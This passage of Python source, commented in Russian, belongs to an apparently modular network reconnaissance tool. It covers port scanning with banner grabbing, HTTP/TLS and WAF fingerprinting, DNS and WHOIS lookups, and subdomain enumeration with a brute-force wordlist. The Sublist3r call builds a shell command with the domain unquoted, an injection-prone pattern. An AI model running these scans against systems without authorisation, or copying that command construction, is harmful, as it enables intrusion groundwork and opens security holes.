    HAS_DNS = True
except ImportError:
    HAS_DNS = False

try:
    import whois as whois_lib
    HAS_WHOIS = True
except ImportError:
    HAS_WHOIS = False


# ==============================================================================
# БАЗА: МОДУЛЬ АНАЛИЗА
# ==============================================================================
class AnalysisModule:
    """Базовый класс для всех модулей анализа"""

    NAME = "base"
    DESCRIPTION = "Базовый модуль"

    def __init__(self, logger: "Logger"):
        self.logger = logger
        self.start_time: Optional[float] = None
        self.end_time: Optional[float] = None
        self.errors: List[str] = []

    def _start(self):
        self.start_time = time.time()
        self.errors = []

    def _stop(self):
        self.end_time = time.time()

    def duration(self) -> float:
        if not self.start_time:
            return 0.0
        end = self.end_time or time.time()
        return end - self.start_time

    def _add_error(self, msg: str):
        self.errors.append(msg)
        self.logger.debug(f"[{self.NAME}] {msg}")

    def run(self, target: "Target", **kwargs) -> Dict[str, Any]:
        """Переопределяется в наследниках"""
        raise NotImplementedError


# ==============================================================================
# PORT SCANNER
# ==============================================================================
class PortScanner(AnalysisModule):
    """
    Сканер портов: TCP + UDP
    - top-1000 портов по умолчанию
    - параллельное сканирование (ThreadPoolExecutor)
    - определение сервисов по баннерам
    - graceful shutdown
    """

    NAME = "ports"
    DESCRIPTION = "Сканирование портов"

    # ---------- ТОП-1000 портов (сокращённый список ~200 популярных) ----------
    COMMON_PORTS = {
        20: "ftp-data", 21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
        53: "dns", 67: "dhcp", 68: "dhcp", 69: "tftp", 80: "http",
        88: "kerberos", 110: "pop3", 111: "rpcbind", 119: "nntp",
        123: "ntp", 135: "msrpc", 137: "netbios-ns", 138: "netbios-dgm",
        139: "netbios-ssn", 143: "imap", 161: "snmp", 162: "snmp-trap",
        179: "bgp", 194: "irc", 389: "ldap", 443: "https",
        445: "microsoft-ds", 465: "smtps", 500: "isakmp", 514: "syslog",
        515: "printer", 520: "rip", 548: "afp", 554: "rtsp",
        587: "submission", 623: "ipmi", 631: "ipp", 636: "ldaps",
        646: "ldp", 873: "rsync", 902: "vmware", 989: "ftps-data",
        990: "ftps", 993: "imaps", 995: "pop3s", 1025: "nfs",
        1080: "socks", 1194: "openvpn", 1433: "mssql", 1434: "mssql-m",
        1521: "oracle", 1701: "l2tp", 1723: "pptp", 1883: "mqtt",
        1900: "upnp", 2049: "nfs", 2082: "cpanel", 2083: "cpanel-ssl",
        2086: "whm", 2087: "whm-ssl", 2095: "webmail", 2096: "webmail-ssl",
        2181: "zookeeper", 2222: "ssh-alt", 2375: "docker", 2376: "docker-ssl",
        3128: "squid", 3260: "iscsi", 3306: "mysql", 3389: "rdp",
        3478: "stun", 3690: "svn", 4000: "icq", 4443: "pharos",
        4567: "sinatra", 5000: "upnp", 5060: "sip", 5061: "sips",
        5222: "xmpp", 5269: "xmpp-server", 5353: "mdns", 5432: "postgresql",
        5555: "android-adb", 5601: "kibana", 5672: "amqp", 5683: "coap",
        5900: "vnc", 5938: "teamviewer", 5984: "couchdb", 5985: "winrm",
        5986: "winrm-ssl", 6000: "x11", 6379: "redis", 6443: "kubernetes",
        6667: "irc", 6881: "bittorrent", 7001: "weblogic", 7002: "weblogic-ssl",
        7070: "realserver", 7443: "oracle-ssl", 7474: "neo4j", 8000: "http-alt",
        8008: "http-alt", 8009: "ajp", 8010: "http-alt", 8042: "http-alt",
        8069: "openerp", 8080: "http-proxy", 8081: "http-alt", 8082: "http-alt",
        8083: "http-alt", 8086: "influxdb", 8088: "http-alt", 8090: "http-alt",
        8123: "http-alt", 8161: "activemq", 8180: "http-alt", 8200: "http-alt",
        8222: "http-alt", 8243: "https-alt", 8280: "http-alt", 8300: "http-alt",
        8333: "bitcoin", 8400: "http-alt", 8443: "https-alt", 8444: "https-alt",
        8500: "consul", 8530: "http-alt", 8531: "https-alt", 8600: "http-alt",
        8649: "ganglia", 8834: "nessus", 8880: "http-alt", 8888: "http-alt",
        8899: "http-alt", 8983: "solr", 9000: "http-alt", 9001: "http-alt",
        9042: "cassandra", 9060: "http-alt", 9080: "http-alt", 9090: "http-alt",
        9091: "http-alt", 9100: "printer", 9160: "cassandra", 9200: "elasticsearch",
        9300: "elasticsearch", 9443: "https-alt", 9500: "http-alt", 9600: "http-alt",
        9800: "http-alt", 9943: "https-alt", 9981: "http-alt", 9999: "http-alt",
        10000: "webmin", 10250: "kubelet", 10443: "https-alt", 11211: "memcached",
        12345: "netbus", 15672: "rabbitmq", 16379: "redis-alt", 25565: "minecraft",
        27017: "mongodb", 27018: "mongodb", 28017: "mongodb-web", 37777: "dahua",
        44818: "ethernet-ip", 47808: "bacnet", 50000: "sap", 50030: "hadoop",
        50060: "hadoop", 50070: "hadoop", 50075: "hadoop", 50090: "hadoop",
        54321: "http-alt", 61616: "activemq",
    }

    # Порты с известными уязвимостями (приоритет)
    HIGH_RISK_PORTS = {21, 23, 135, 139, 445, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 27017}

    # UDP порты
    UDP_PORTS = {53, 67, 68, 69, 123, 137, 138, 161, 162, 500, 514, 520, 1900, 4500, 5353}

    def __init__(self, logger: "Logger", timeout: float = 1.5, max_workers: int = 100):
        super().__init__(logger)
        self.timeout = timeout
        self.max_workers = max_workers

    def scan(self, target: "Target",
             ports: Optional[List[int]] = None,
             udp: bool = False,
             grab_banners: bool = True,
             top_only: bool = False) -> Dict[str, Any]:
        """
        Сканирует порты цели

        ports       — список портов (если None — COMMON_PORTS)
        udp         — сканировать UDP тоже
        grab_banners — пытаться получить баннер сервиса
        top_only    — только топ-50
        """
        self._start()
        result = {
            "ports": {},
            "open_count": 0,
            "udp_ports": {},
            "scanned": 0,
            "errors": [],
            "duration": 0.0,
        }

        if not target.ip:
            self._add_error("Нет IP для сканирования")
            result["errors"] = self.errors
            self._stop()
            result["duration"] = self.duration()
            return result

        # Определяем порты
        if ports:
            port_list = list(ports)
        elif top_only:
            port_list = [22, 80, 443, 21, 25, 3306, 3389, 8080, 8443, 5900]
        else:
            port_list = list(self.COMMON_PORTS.keys())

        result["scanned"] = len(port_list)
        self.logger.info(f"  TCP-сканирование {target.ip} ({len(port_list)} портов)...")

        # ---------- TCP ----------
        open_ports = self._scan_tcp(target.ip, port_list)

        for port in open_ports:
            service = self.COMMON_PORTS.get(port, "unknown")
            result["ports"][port] = {
                "service": service,
                "banner": None,
                "risk": "high" if port in self.HIGH_RISK_PORTS else "normal",
            }

        # ---------- Баннеры ----------
        if grab_banners and open_ports:
            self.logger.debug(f"  Получение баннеров...")
            banners = self._grab_banners(target.ip, open_ports[:20])
            for port, banner in banners.items():
                if port in result["ports"]:
                    result["ports"][port]["banner"] = banner

        # ---------- UDP ----------
        if udp:
            self.logger.info(f"  UDP-сканирование...")
            udp_open = self._scan_udp(target.ip, list(self.UDP_PORTS))
            for port in udp_open:
                result["udp_ports"][port] = self.COMMON_PORTS.get(port, "unknown")

        result["open_count"] = len(result["ports"])
        result["errors"] = self.errors
        self._stop()
        result["duration"] = self.duration()

        return result

    # ---------- TCP ----------
    def _scan_tcp(self, ip: str, ports: List[int]) -> List[int]:
        """Параллельное TCP-сканирование"""
        open_ports: List[int] = []
        lock = __import__('threading').Lock()

        def check(port: int):
            if is_shutdown_requested():
                return
            if self._check_tcp_port(ip, port):
                with lock:
                    open_ports.append(port)

        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = [ex.submit(check, p) for p in ports]
            for _ in as_completed(futures):
                pass

        return sorted(open_ports)

    def _check_tcp_port(self, ip: str, port: int) -> bool:
        """Проверка одного TCP-порта"""
        try:
            family = socket.AF_INET6 if ':' in ip else socket.AF_INET
            with socket.socket(family, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                return s.connect_ex((ip, port)) == 0
        except (socket.error, OSError, ValueError):
            return False

    # ---------- UDP ----------
    def _scan_udp(self, ip: str, ports: List[int]) -> List[int]:
        """UDP-сканирование (менее надёжное)"""
        open_ports: List[int] = []
        for port in ports:
            if is_shutdown_requested():
                break
            if self._check_udp_port(ip, port):
                open_ports.append(port)
        return open_ports

    def _check_udp_port(self, ip: str, port: int) -> bool:
        """Проверка UDP-порта (эвристика)"""
        try:
            family = socket.AF_INET6 if ':' in ip else socket.AF_INET
            with socket.socket(family, socket.SOCK_DGRAM) as s:
                s.settimeout(self.timeout)
                s.sendto(b'\x00', (ip, port))
                try:
                    s.recvfrom(1024)
                    return True  # ответил — открыт
                except socket.timeout:
                    return False
                except ConnectionRefusedError:
                    return False  # ICMP port unreachable — закрыт
        except Exception:
            return False

    # ---------- Баннеры ----------
    def _grab_banners(self, ip: str, ports: List[int]) -> Dict[int, str]:
        """Пытается получить баннер сервиса"""
        banners: Dict[int, str] = {}

        def grab(port: int):
            banner = self._grab_one_banner(ip, port)
            if banner:
                banners[port] = banner

        with ThreadPoolExecutor(max_workers=20) as ex:
            futures = [ex.submit(grab, p) for p in ports]
            for _ in as_completed(futures):
                pass

        return banners

    def _grab_one_banner(self, ip: str, port: int) -> Optional[str]:
        """Получение баннера одного порта"""
        try:
            family = socket.AF_INET6 if ':' in ip else socket.AF_INET
            with socket.socket(family, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((ip, port))

                # Для HTTP/HTTPS отправляем запрос
                if port in (80, 8080, 8000, 8888, 8081):
                    s.send(b"HEAD / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
                elif port in (443, 8443):
                    return "https (TLS)"
                elif port == 21:
                    pass  # FTP сам пришлёт
                elif port == 22:
                    pass  # SSH сам пришлёт
                elif port == 25 or port == 587:
                    pass  # SMTP сам пришлёт

                data = s.recv(1024)
                if not data:
                    return None

                banner = data.decode('utf-8', errors='ignore').strip()

                # Для HTTP вытаскиваем Server
                if banner.startswith("HTTP/"):
                    for line in banner.split('\r\n'):
                        if line.lower().startswith("server:"):
                            return line.strip()

                return Utils.truncate(banner, 200)
        except Exception:
            return None


# ==============================================================================
# HTTP ANALYZER
# ==============================================================================
class HTTPAnalyzer(AnalysisModule):
    """
    HTTP/HTTPS анализатор
    - заголовки, статус, title
    - SSL/TLS сертификат
    - WAF-детект (Cloudflare, Sucuri, AWS WAF, Akamai, Imperva)
    - технологии (Server, X-Powered-By, cookies)
    - security headers
    - редиректы
    """

    NAME = "http"
    DESCRIPTION = "HTTP-анализ"

    # Признаки WAF
    WAF_SIGNATURES = {
        "Cloudflare": ["cf-ray", "cf-cache-status", "__cfduid", "cf-request-id"],
        "Sucuri": ["x-sucuri-id", "x-sucuri-cache", "server: sucuri"],
        "AWS WAF": ["x-amzn-requestid", "x-amz-cf-id", "awselb"],
        "Akamai": ["akamai", "x-akamai-transformed", "akamaighost"],
        "Imperva": ["x-iinfo", "incap_ses", "visid_incap"],
        "F5 BIG-IP": ["x-wa-info", "bigipserver", "ts cookie"],
        "ModSecurity": ["mod_security", "modsecurity"],
        "Barracuda": ["barra_counter_session", "barracuda"],
        "Fastly": ["x-served-by", "x-fastly", "fastly-io-info"],
        "Varnish": ["x-varnish", "via: varnish"],
    }

    # Security headers
    SECURITY_HEADERS = {
        "Strict-Transport-Security": "HSTS",
        "Content-Security-Policy": "CSP",
        "X-Content-Type-Options": "X-Content-Type-Options",
        "X-Frame-Options": "X-Frame-Options",
        "X-XSS-Protection": "X-XSS-Protection",
        "Referrer-Policy": "Referrer-Policy",
        "Permissions-Policy": "Permissions-Policy",
        "Cross-Origin-Opener-Policy": "COOP",
        "Cross-Origin-Resource-Policy": "CORP",
        "Cross-Origin-Embedder-Policy": "COEP",
    }

    def __init__(self, logger: "Logger", timeout: int = 10,
                 follow_redirects: bool = True, verify_ssl: bool = False):
        super().__init__(logger)
        self.timeout = timeout
        self.follow_redirects = follow_redirects
        self.verify_ssl = verify_ssl

    def analyze(self, target: "Target", force_scheme: Optional[str] = None) -> Dict[str, Any]:
        """
        Синхронная обёртка вокруг async analyze
        """
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                # Уже в async-контексте — запускаем в отдельном потоке
                import concurrent.futures
                with concurrent.futures.ThreadPoolExecutor() as ex:
                    return ex.submit(
                        lambda: asyncio.run(self._analyze_async(target, force_scheme))
                    ).result()
            else:
                return loop.run_until_complete(self._analyze_async(target, force_scheme))
        except RuntimeError:
            return asyncio.run(self._analyze_async(target, force_scheme))

    async def _analyze_async(self, target: "Target",
                              force_scheme: Optional[str] = None) -> Dict[str, Any]:
        """Асинхронный анализ HTTP"""
        self._start()
        result = self._empty_result()

        if not HAS_AIOHTTP:
            self._add_error("aiohttp не установлен")
            result["errors"] = self.errors
            self._stop()
            result["duration"] = self.duration()
            return result

        schemes = [force_scheme] if force_scheme else ["https", "http"]

        for scheme in schemes:
            url = target.base_url(scheme)
            try:
                r = await self._fetch(url)
                if r:
                    result.update(r)
                    result["scheme"] = scheme
                    result["url"] = url
                    break
            except Exception as e:
                self._add_error(f"{scheme}: {e}")

        # SSL (только для https)
        if result.get("scheme") == "https":
            try:
                result["ssl"] = self._check_ssl(target.hostname, target.port or 443)
            except Exception as e:
                self._add_error(f"SSL: {e}")

        result["errors"] = self.errors
        self._stop()
        result["duration"] = self.duration()
        return result

    def _empty_result(self) -> Dict[str, Any]:
        return {
            "status_code": None,
            "headers": {},
            "server": None,
            "content_type": None,
            "title": None,
            "cookies": [],
            "technologies": [],
            "security_headers": {},
            "waf": None,
            "has_cloudflare": False,
            "redirects": [],
            "ssl": None,
            "errors": [],
            "duration": 0.0,
            "scheme": None,
            "url": None,
        }

    async def _fetch(self, url: str) -> Optional[Dict[str, Any]]:
        """Асинхронный GET-запрос"""
        headers = {
            "User-Agent": Utils.get_random_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }

        timeout = aiohttp.ClientTimeout(total=self.timeout)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(
                url,
                headers=headers,
                ssl=self.verify_ssl,
                allow_redirects=self.follow_redirects,
                max_redirects=5,
            ) as resp:

                result = self._empty_result()
                result["status_code"] = resp.status
                result["headers"] = dict(resp.headers)
                result["content_type"] = resp.headers.get("Content-Type")
                result["server"] = resp.headers.get("Server")

                # Редиректы
                if resp.history:
                    result["redirects"] = [
                        {"status": h.status, "location": h.headers.get("Location")}
                        for h in resp.history
                    ]

                # Cookies
                cookies = []
                for c in resp.cookies.values():
                    cookies.append({
                        "name": c.key,
                        "value": Utils.truncate(c.value, 50),
                        "secure": c.get("secure", False),
                        "httponly": c.get("httponly", False),
                    })
                result["cookies"] = cookies

                # WAF
                result.update(self._detect_waf(resp.headers))

                # Security headers
                result["security_headers"] = self._extract_security_headers(resp.headers)

                # Технологии
                result["technologies"] = self._detect_technologies(resp.headers, url)

                # Title
                try:
                    html = await resp.text(errors='ignore')
                    result["title"] = self._extract_title(html)
                except Exception:
                    pass

                return result

    # ---------- SSL ----------
    def _check_ssl(self, hostname: str, port: int = 443) -> Dict[str, Any]:
        """Проверка SSL/TLS сертификата"""
        result = {
            "valid": False,
            "issuer": None,
            "subject": None,
            "expires": None,
            "issued": None,
            "days_left": None,
            "version": None,
            "cipher": None,
            "san": [],
            "error": None,
        }

        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            with socket.create_connection((hostname, port), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    result["valid"] = bool(cert)
                    result["version"] = ssock.version()
                    cipher = ssock.cipher()
                    result["cipher"] = cipher[0] if cipher else None

                    if cert:
                        # Issuer
                        issuer = cert.get("issuer", [])
                        result["issuer"] = self._format_cert_name(issuer)
                        # Subject
                        subject = cert.get("subject", [])
                        result["subject"] = self._format_cert_name(subject)
                        # SAN
                        result["san"] = [v for k, v in cert.get("subjectAltName", [])]

                        # Даты
                        if "notAfter" in cert:
                            exp = datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
                            result["expires"] = exp.isoformat()
                            result["days_left"] = (exp - datetime.now()).days
                            if result["days_left"] < 0:
                                result["valid"] = False
                        if "notBefore" in cert:
                            iss = datetime.strptime(cert["notBefore"], "%b %d %H:%M:%S %Y %Z")
                            result["issued"] = iss.isoformat()
        except ssl.SSLError as e:
            result["error"] = f"SSL: {e}"
        except socket.timeout:
            result["error"] = "Timeout"
        except Exception as e:
            result["error"] = str(e)

        return result

    def _format_cert_name(self, parts) -> str:
        """Форматирует issuer/subject сертификата"""
        try:
            d = {}
            for item in parts:
                for k, v in item:
                    d[k] = v
            if "commonName" in d:
                return d["commonName"]
            if "organizationName" in d:
                return d["organizationName"]
            return str(parts)
        except Exception:
            return str(parts)

    # ---------- WAF ----------
    def _detect_waf(self, headers) -> Dict[str, Any]:
        """Определяет WAF по заголовкам"""
        result = {"waf": None, "has_cloudflare": False}

        # Приводим заголовки к нижнему регистру
        h = {k.lower(): str(v).lower() for k, v in headers.items()}
        all_text = " ".join(f"{k}:{v}" for k, v in h.items())

        for waf_name, signatures in self.WAF_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in all_text:
                    result["waf"] = waf_name
                    if waf_name == "Cloudflare":
                        result["has_cloudflare"] = True
                    return result

        # Отдельно Cloudflare
        if "cf-ray" in h or "cloudflare" in h.get("server", ""):
            result["waf"] = "Cloudflare"
            result["has_cloudflare"] = True

        return result

    # ---------- Security headers ----------
    def _extract_security_headers(self, headers) -> Dict[str, Any]:
        """Извлекает security-заголовки"""
        result = {}
        for header, name in self.SECURITY_HEADERS.items():
            if header in headers:
                result[name] = Utils.truncate(headers[header], 200)
        return result

    # ---------- Технологии ----------
    def _detect_technologies(self, headers, url: str) -> List[str]:
        """Определяет технологии по заголовкам и URL"""
        techs = set()

        # По заголовкам
        if "X-Powered-By" in headers:
            techs.add(f"Powered-By: {headers['X-Powered-By']}")
        if "X-Generator" in headers:
            techs.add(f"Generator: {headers['X-Generator']}")
        if "X-AspNet-Version" in headers:
            techs.add(f"ASP.NET {headers['X-AspNet-Version']}")
        if "X-AspNetMvc-Version" in headers:
            techs.add(f"ASP.NET MVC {headers['X-AspNetMvc-Version']}")
        if "X-Drupal-Cache" in headers:
            techs.add("Drupal")
        if "X-Drupal-Dynamic-Cache" in headers:
            techs.add("Drupal")
        if "X-Generator" in headers and "WordPress" in headers["X-Generator"]:
            techs.add("WordPress")
        if "X-Shopify-Stage" in headers:
            techs.add("Shopify")
        if "X-Varnish" in headers:
            techs.add("Varnish")
        if "X-Cache" in headers:
            techs.add("CDN-Cache")
        if "X-Cache-Hits" in headers:
            techs.add("Fastly")

        # Server
        server = (headers.get("Server") or "").lower()
        for kw, name in [
            ("nginx", "nginx"), ("apache", "Apache"), ("iis", "IIS"),
            ("caddy", "Caddy"), ("gunicorn", "Gunicorn"), ("uvicorn", "Uvicorn"),
            ("cloudflare", "Cloudflare"), ("openresty", "OpenResty"),
            ("litespeed", "LiteSpeed"), ("tomcat", "Tomcat"),
        ]:
            if kw in server:
                techs.add(name)

        # Cookies
        cookie_str = " ".join(
            f"{c.split('=')[0]}" for c in headers.getall("Set-Cookie", []) if isinstance(headers, dict) and hasattr(headers, "getall")
        ) if hasattr(headers, "getall") else ""
        if "PHPSESSID" in cookie_str:
            techs.add("PHP")
        if "JSESSIONID" in cookie_str:
            techs.add("Java")
        if "ASP.NET_SessionId" in cookie_str:
            techs.add("ASP.NET")
        if "laravel_session" in cookie_str:
            techs.add("Laravel")
        if "django" in cookie_str.lower():
            techs.add("Django")
        if "wordpress" in cookie_str.lower():
            techs.add("WordPress")

        return sorted(techs)

    # ---------- Title ----------
    def _extract_title(self, html: str) -> Optional[str]:
        """Извлекает <title> из HTML"""
        if not html:
            return None
        try:
            m = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
            if m:
                title = m.group(1).strip()
                # Убираем лишние пробелы
                title = re.sub(r'\s+', ' ', title)
                return Utils.truncate(title, 200)
        except Exception:
            pass
        return None


# ==============================================================================
# DNS ANALYZER
# ==============================================================================
class DNSAnalyzer(AnalysisModule):
    """
    DNS-анализатор
    A, AAAA, MX, NS, TXT, CNAME, SOA, PTR, CAA, SRV
    """

    NAME = "dns"
    DESCRIPTION = "DNS-анализ"

    RECORD_TYPES = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "CAA", "SRV"]

    def __init__(self, logger: "Logger", timeout: int = 5):
        super().__init__(logger)
        self.timeout = timeout

    def analyze(self, target: "Target") -> Dict[str, Any]:
        """Анализирует DNS-записи"""
        self._start()
        result = {
            "records": {},
            "has_mx": False,
            "has_txt": False,
            "has_cname": False,
            "has_spf": False,
            "has_dmarc": False,
            "ns": [],
            "mx": [],
            "txt": [],
            "errors": [],
            "duration": 0.0,
        }

        if not HAS_DNS:
            self._add_error("dnspython не установлен")
            result["errors"] = self.errors
            self._stop()
            result["duration"] = self.duration()
            return result

        if not target.hostname:
            self._add_error("Нет домена")
            result["errors"] = self.errors
            self._stop()
            result["duration"] = self.duration()
            return result

        # Резолвер
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = self.timeout
            resolver.lifetime = self.timeout
        except Exception as e:
            self._add_error(f"Resolver: {e}")
            resolver = None

        # Основные записи
        for rtype in self.RECORD_TYPES:
            if is_shutdown_requested():
                break
            values = self._query(resolver, target.hostname, rtype)
            if values:
                result["records"][rtype] = values
                if rtype == "MX":
                    result["has_mx"] = True
                    result["mx"] = values
                elif rtype == "NS":
                    result["ns"] = values
                elif rtype == "TXT":
                    result["has_txt"] = True
                    result["txt"] = values
                    for v in values:
                        vl = v.lower()
                        if "v=spf1" in vl:
                            result["has_spf"] = True
                elif rtype == "CNAME":
                    result["has_cname"] = True

        # DMARC
        dmarc = self._query(resolver, f"_dmarc.{target.hostname}", "TXT")
        if dmarc:
            result["has_dmarc"] = True
            result["records"]["DMARC"] = dmarc

        # PTR (reverse DNS)
        if target.ip:
            ptr = self._reverse_dns(target.ip)
            if ptr:
                result["records"]["PTR"] = [ptr]

        result["errors"] = self.errors
        self._stop()
        result["duration"] = self.duration()
        return result

    def _query(self, resolver, name: str, rtype: str) -> List[str]:
        """Выполняет один DNS-запрос"""
        if resolver is None:
            return []
        try:
            answers = resolver.resolve(name, rtype, lifetime=self.timeout)
            return [str(a).strip('"') for a in answers]
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
                dns.resolver.NoNameservers, dns.exception.Timeout):
            return []
        except Exception as e:
            self._add_error(f"{rtype} {name}: {e}")
            return []

    def _reverse_dns(self, ip: str) -> Optional[str]:
        """Обратный DNS-запрос"""
        try:
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return None


# ==============================================================================
# OSINT MODULE
# ==============================================================================
class OSINTModule(AnalysisModule):
    """
    OSINT-модуль
    - WHOIS
    - DNS-история (эмуляция через crt.sh)
    """

    NAME = "osint"
    DESCRIPTION = "OSINT / WHOIS"

    def __init__(self, logger: "Logger"):
        super().__init__(logger)

    def whois(self, target: "Target") -> Dict[str, Any]:
        """WHOIS-запрос"""
        self._start()
        result = {
            "domain": target.hostname,
            "registrar": None,
            "creation_date": None,
            "expiration_date": None,
            "updated_date": None,
            "name_servers": [],
            "status": [],
            "emails": [],
            "country": None,
            "org": None,
            "raw": None,
            "errors": [],
            "duration": 0.0,
        }

        if not HAS_WHOIS:
            self._add_error("python-whois не установлен")
            result["errors"] = self.errors
            self._stop()
            result["duration"] = self.duration()
            return result

        try:
            w = whois_lib.whois(target.hostname)

            result["registrar"] = w.registrar
            result["country"] = getattr(w, "country", None)
            result["org"] = getattr(w, "org", None)

            # Даты (могут быть list)
            for key in ("creation_date", "expiration_date", "updated_date"):
                v = getattr(w, key, None)
                if isinstance(v, list):
                    v = v[0] if v else None
                result[key] = str(v) if v else None

            # NS
            ns = getattr(w, "name_servers", None)
            if ns:
                if isinstance(ns, str):
                    ns = [ns]
                result["name_servers"] = [str(x).lower() for x in ns]

            # Status
            st = getattr(w, "status", None)
            if st:
                if isinstance(st, str):
                    st = [st]
                result["status"] = [str(x) for x in st]

            # Emails
            em = getattr(w, "emails", None)
            if em:
                if isinstance(em, str):
                    em = [em]
                result["emails"] = [str(x) for x in em]

            result["raw"] = str(w)[:2000]

        except Exception as e:
            self._add_error(f"WHOIS: {e}")

        result["errors"] = self.errors
        self._stop()
        result["duration"] = self.duration()
        return result

    def analyze(self, target: "Target") -> Dict[str, Any]:
        """Полный OSINT-анализ"""
        return {
            "whois": self.whois(target),
        }


# ==============================================================================
# SUBDOMAIN MODULE
# ==============================================================================
class SubdomainModule(AnalysisModule):
    """
    Поиск поддоменов
    Источники:
        - crt.sh (Certificate Transparency)
        - Sublist3r (если скачан)
        - amass (если скачан)
        - subfinder (если скачан)
        - DNS-брутфорс по словарю (опционально)
    """

    NAME = "subdomains"
    DESCRIPTION = "Поиск поддоменов"

    # Небольшой словарь для DNS-брутфорса
    COMMON_SUBDOMAINS = [
        "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk",
        "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test",
        "ns", "blog", "pop3", "dev", "www2", "admin", "forum", "news", "vpn",
        "ns3", "mail2", "new", "mysql", "old", "lists", "support", "mobile",
        "mx", "static", "docs", "beta", "shop", "sql", "secure", "demo",
        "cp", "calendar", "wiki", "web", "media", "email", "images", "img",
        "www1", "intranet", "portal", "video", "sip", "dns2", "api", "cdn",
        "stats", "dns1", "ns4", "www3", "dns", "search", "staging", "server",
        "mx1", "chat", "wap", "my", "svn", "mail1", "sites", "proxy",
        "ads", "host", "crm", "cms", "backup", "mx2", "lyncdiscover",
        "info", "apps", "download", "remote", "db", "forums", "store",
        "relay", "files", "newsletter", "app", "live", "owa", "en",
        "start", "sms", "office", "exchange", "ipv4",
    ]

    def __init__(self, logger: "Logger", repo_manager: "RepoManager",
                 max_subdomains: int = 500):
        super().__init__(logger)
        self.repo_manager = repo_manager
        self.max_subdomains = max_subdomains

    def find(self, target: "Target", use_bruteforce: bool = False,
             use_tools: bool = True) -> Dict[str, Any]:
        """
        Ищет поддомены

        use_bruteforce — использовать DNS-брутфорс
        use_tools      — использовать внешние инструменты (Sublist3r, amass, subfinder)
        """
        self._start()
        result = {
            "subdomains": [],
            "total": 0,
            "sources": [],
            "by_source": {},
            "errors": [],
            "duration": 0.0,
        }

        domain = target.hostname
        if not domain or target.is_ip:
            self._add_error("Поддомены ищутся только для доменов")
            result["errors"] = self.errors
            self._stop()
            result["duration"] = self.duration()
            return result

        collected = set()

        # 1. crt.sh
        if not is_shutdown_requested():
            try:
                subs = self._crt_sh(domain)
                if subs:
                    result["sources"].append("crt.sh")
                    result["by_source"]["crt.sh"] = subs
                    collected.update(subs)
                    self.logger.info(f"    crt.sh: {len(subs)}")
            except Exception as e:
                self._add_error(f"crt.sh: {e}")

        # 2. Sublist3r
        if use_tools and not is_shutdown_requested():
            try:
                subs = self._run_sublist3r(domain)
                if subs:
                    result["sources"].append("Sublist3r")
                    result["by_source"]["Sublist3r"] = subs
                    collected.update(subs)
                    self.logger.info(f"    Sublist3r: {len(subs)}")
            except Exception as e:
                self._add_error(f"Sublist3r: {e}")

        # 3. amass
        if use_tools and not is_shutdown_requested():
            try:
                subs = self._run_amass(domain)
                if subs:
                    result["sources"].append("amass")
                    result["by_source"]["amass"] = subs
                    collected.update(subs)
                    self.logger.info(f"    amass: {len(subs)}")
            except Exception as e:
                self._add_error(f"amass: {e}")

        # 4. subfinder
        if use_tools and not is_shutdown_requested():
            try:
                subs = self._run_subfinder(domain)
                if subs:
                    result["sources"].append("subfinder")
                    result["by_source"]["subfinder"] = subs
                    collected.update(subs)
                    self.logger.info(f"    subfinder: {len(subs)}")
            except Exception as e:
                self._add_error(f"subfinder: {e}")

        # 5. DNS-брутфорс
        if use_bruteforce and not is_shutdown_requested():
            try:
                subs = self._dns_bruteforce(domain)
                if subs:
                    result["sources"].append("dns-bruteforce")
                    result["by_source"]["dns-bruteforce"] = subs
                    collected.update(subs)
                    self.logger.info(f"    DNS-bruteforce: {len(subs)}")
            except Exception as e:
                self._add_error(f"bruteforce: {e}")

        # Финал
        subs = sorted(collected)
        if len(subs) > self.max_subdomains:
            subs = subs[:self.max_subdomains]

        result["subdomains"] = subs
        result["total"] = len(subs)
        result["errors"] = self.errors
        self._stop()
        result["duration"] = self.duration()
        return result

    # ---------- crt.sh ----------
    def _crt_sh(self, domain: str) -> List[str]:
        """Ищет поддомены через crt.sh"""
        if not HAS_REQUESTS:
            return []

        subs = set()
        url = f"https://crt.sh/?q=%25.{domain}&output=json"

        try:
            r = requests.get(
                url,
                timeout=20,
                headers={"User-Agent": Utils.get_random_ua()}
            )
            if r.status_code != 200:
                return []
            data = r.json()
            for entry in data:
                for name in (entry.get("name_value") or "").split("\n"):
                    name = name.strip().lower().lstrip("*.")
                    if name.endswith(domain) and name != domain and " " not in name:
                        subs.add(name)
        except Exception as e:
            self._add_error(f"crt.sh: {e}")

        return sorted(subs)

    # ---------- Sublist3r ----------
    def _run_sublist3r(self, domain: str) -> List[str]:
        """Запускает Sublist3r из RepoManager"""
        repo_path = self.repo_manager.get_repo_path("sublist3r")
        if not repo_path:
            return []

        script = repo_path / "sublist3r.py"
        if not script.exists():
            return []

        try:
            cmd = f'"{sys.executable}" "{script}" -d {domain} -v -t 20'
            ok, out, err = self.repo_manager._run_command(cmd, timeout=120)
            if not ok:
                return []

            subs = set()
            for line in out.splitlines():
                line = line.strip()
                if not line or line.startswith("[") or line.startswith(" "):
                    continue
                # Sublist3r выводит чистые домены
                if domain in line and " " not in line:
